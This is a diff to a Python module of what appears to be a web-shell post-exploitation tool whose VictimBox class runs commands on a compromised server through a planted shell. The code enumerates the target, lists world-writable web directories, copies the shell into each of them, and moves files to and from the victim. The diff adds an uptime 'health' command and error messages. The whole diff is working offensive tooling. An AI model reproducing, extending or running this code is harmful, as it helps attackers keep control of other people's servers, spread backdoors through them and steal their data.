@@ -21,8 +21,7 @@ class VictimBox(object):
         self.kernel_info = source[2]
         self.cwd = source[3]
         self.uptime = source[4]
-        self.cpu_load = source[5]
-        self.host_ip = ', '.join(source[6:])
+        self.host_ip = ', '.join(source[5:])
         try:
             # get the attacker's ip address thx to hostess
             self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
@@ -32,7 +31,7 @@ class VictimBox(object):
         # adding another command requires editing two modules
         # 1st- define the method here "victim_info.py" module
         # then add a logic statment in "executer.py" module
-        self.available_commands = "['banner', 'clear', 'download', 'exit', 'history', 'info', 'spread', 'upload', 'writable']"
+        self.available_commands = "['banner', 'clear', 'download', 'enum --health', 'exit', 'history', 'info', 'spread', 'upload', 'writable']"
 
     def get_information(self):
         self.info = \
@@ -45,7 +44,6 @@ class VictimBox(object):
         {red}Uptime{end}      :  {green}{uptime}{end}
         {red}Targets IPs{end} :  {green}{host_ip}{end}
         {red}Our IP{end}      :  {green}{local_ip}{end}
-        {red}CPU Load{end}    :  {green}{cpu_load}{end}
         {dashed}
 
         {hot}[+] Available commands: {available_commands}{end}
@@ -59,7 +57,6 @@ class VictimBox(object):
                 uptime=self.uptime,
                 host_ip=self.host_ip,
                 local_ip=self.local_ip,
-                cpu_load=self.cpu_load,
                 available_commands=self.available_commands,)
         print self.info
 
@@ -67,10 +64,13 @@ class VictimBox(object):
     def get_writable(self):
         make_request.cmd = "find {0} -depth -perm -0002 -type d".format(linux.get_doc_root())
         self.writables = map(str.strip, make_request.get_page_source().readlines())
-        c = 1
-        for path in self.writables:
-            print '{0:2d}- {1}'.format(c, path)
-            c += 1
+        if self.writables:
+            c = 1
+            for path in self.writables:
+                print '{0:2d}- {1}'.format(c, path)
+                c += 1
+        else:
+            print '\n{0}[!]Can\'t find any wriable directories{1}'.format(Colors.RED, Colors.END)
 
     # a method to spread the shell in all writable directories
     def spread_shell(self):
@@ -78,7 +78,7 @@ class VictimBox(object):
         shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
         make_request.cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp {1}'.format(linux.get_doc_root(), shell_name)
         print make_request.get_page_source().read()
-        print '[+] Successfully spread {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
+        print '[+] Attempted to spread "{0}" into any writable paths\n[+] Type "writable" to these locations'.format(shell_name)
 
     # a method for downloading files from the box
     def download_file(self, rfile_path, lfile_path):
@@ -93,7 +93,7 @@ class VictimBox(object):
             except IOError, e:
                 print '{0}\n[!] {1}{2}'.format(Colors.RED, e, Colors.END)
         elif file_type == 'dir':
-            make_request.cmd = 'find {0} |while read f;do echo "$f";done'.format(rfile_path)
+            make_request.cmd = 'find {0} | while read f;do echo "$f";done'.format(rfile_path)
             files = map(str.strip, make_request.get_page_source().readlines())
             for file in files:
                 make_request.cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo "file"; else echo "dir"; fi; fi'.format(file)
@@ -111,7 +111,7 @@ class VictimBox(object):
                     print '{0}[!] Coudln\'t download the following file: {1} {2}'.format(Colors.RED, Colors.END, file)
             print '\n{0}[+] Files downloaded successfully to: {1} {2}'.format(Colors.GREEN, Colors.END, lfile_path)
         else:
-            print '\n{0}[!]The file/dir doesn\'t exist or I don\'t have permission{1}'.format(Colors.RED, Colors.END)
+            print '\n{0}[!]The file/directory doesn\'t exist or I don\'t have permission{1}'.format(Colors.RED, Colors.END)
 
     # a method for uploading files to the box
     def upload_file(self, lfile_path, rfile_path):
@@ -121,6 +121,13 @@ class VictimBox(object):
             make_request.cmd = 'echo {0} >> {1}'.format(line.strip(), rfile_path)
             make_request.get_page_source()
         print '\n[+] Successfully uploaded {0} to {1}'.format(lfile_path, rfile_path)
+
+    # displays the target's "health" (CPU, Memory usage etc)
+    def enum_health(self):
+		make_request.cmd = "uptime | awk '{print $3 \":\" $5}' | tr -d \",\" | awk -F \":\" '{print $1 \" days, \" $2 \" hours and \" $3 \" minutes\" }'"
+		uptime = make_request.get_page_source().read()
+		print '\n{0}[+] Uptime: {1} {2}'.format(Colors.GREEN, uptime, Colors.END)
+		
 
 # taking an instance from VictimBox class
 victim_box = VictimBox()
